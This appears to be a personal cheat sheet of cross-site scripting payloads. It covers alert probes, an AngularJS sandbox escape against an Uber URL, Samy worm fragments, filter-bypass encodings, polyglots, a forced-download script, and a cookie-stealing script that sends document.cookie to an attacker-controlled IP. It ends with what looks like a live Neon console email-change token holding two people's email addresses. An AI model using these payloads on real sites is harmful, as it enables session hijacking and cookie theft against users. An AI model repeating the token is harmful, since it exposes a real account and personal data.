XSS Payloads

<img src='x' onerror='alert(1)'>
<img src="x" onerror="alert('XXsed by 07B4')">

<img src="" onerror="alert(document.cookie)" />

<input type="text" name="username" value="hacker" onfocus=alert(document.cookie) autofocus "" width=50px>

<span style="color: red"> Github </span>

Using the following JavaScript within the Uber URL, Kettle escaped
the AngularJS Sandbox and executed the alert function:
https://developer.uber.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}
[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")
()}}zzzz
MORAL: Search for sandbox escape payloads

From Samy's MySpace worm
<div style="background:url('javascript:alert(1)')">
eval('xmlhttp.onread' + 'ystatechange = callback');
<div
    id="mycode" expr="alert('hah!')"
    style="background:url('javascript:eval(document.all.mycode.expr)')"
>

// attacker input to innerHTML
<img src="test.jpg" alt="``onload=xss()" />
double encoded <TEST WITH PROXY>
%253Cimg%2520src%253D%2522test.jpg%2522%2520alt%253D%2522%2560%2560onload%253Dxss%2528%2529%2522%2520%252F%253E
// browser output
<IMG alt=``onload=xss() src="test.jpg">


Polyglots 
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(6))>
<%tag style="xss:expression(alert(6))">

<s>000'")};--//

onerror=alert;throw 1;
onerror=eval;throw'=alert\x281\x29';
Neither of these examples contains suspicious parentheses. However for them
to work, their injection point has to exist within an attribute of an HTML element.

Inserting a NULL byte anywhere before a blocked expression
can cause some filters to stop processing the input and therefore not identify
the expression. For example:
%00<script>alert(1)</script>

https://d3adend.org/xss/ghettoBypass

Cookie Stealing XSS: 
<script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie%2B '" >');<script>

Forcing the Download of a File: 
<script>var link = document.createElement('a'); link.href ='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';
link.download = ''; document.body.appendChild(link); link.click();
</script>

Redirecting User: 
<script>window.location ="https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>

Other Scripts to Enable Key Loggers, Take Pictures, and More
http://www.xss-payloads.com/payloads-list.html?c#category=capture

<b onmouseover=alert('XSS')>Click Me!</b>
<svg onload=alert(1)>
<body onload="alert('XSS')">
<img src="http://test.cyberspacekittens.com"
onerror=alert(document.cookie);>

/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert()
)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--
!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/BurpSuite-ParamMiner


https://console.neon.tech/realms/prod-realm/login-actions/action-token?key=eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJkNDZhYzhiZi04OTdjLTRlMDItYjg1Yi0zZTg5YzdlNDNiZjQifQ.eyJleHAiOjE3NDA4NjkyOTQsImlhdCI6MTc0MDg2ODM5NCwianRpIjoiYTM4ZjFjNGItZmM0Ny00MWQ1LTg0NWItNzdmZDE5ZjI4MGU0IiwiaXNzIjoiaHR0cHM6Ly9jb25zb2xlLm5lb24udGVjaC9yZWFsbXMvcHJvZC1yZWFsbSIsImF1ZCI6Imh0dHBzOi8vY29uc29sZS5uZW9uLnRlY2gvcmVhbG1zL3Byb2QtcmVhbG0iLCJzdWIiOiIzNDUxNTFiNS1iMGY0LTQ2MjgtOWQ2Zi0yOGJlNDVkOWUwNDMiLCJ0eXAiOiJ1cGRhdGUtZW1haWwiLCJhenAiOiJuZW9uLWNvbnNvbGUiLCJub25jZSI6ImEzOGYxYzRiLWZjNDctNDFkNS04NDViLTc3ZmQxOWYyODBlNCIsIm9sZEVtYWlsIjoic3RhcmxldGdoQGdtYWlsLmNvbSIsIm5ld0VtYWlsIjoic21hdmVyaWNrQHdlYXJlaGFja2Vyb25lLmNvbSIsImxvZ291dFNlc3Npb25zIjp0cnVlfQ.jIpa9kZ8qYNERyzcenof9DU-Y72un3crHqYTfhuSz4WZY0NDkGZbSvqhNJ0dHEogPXjgwkCuLIAeTwjClBmj4Q&client_id=neon-console&tab_id=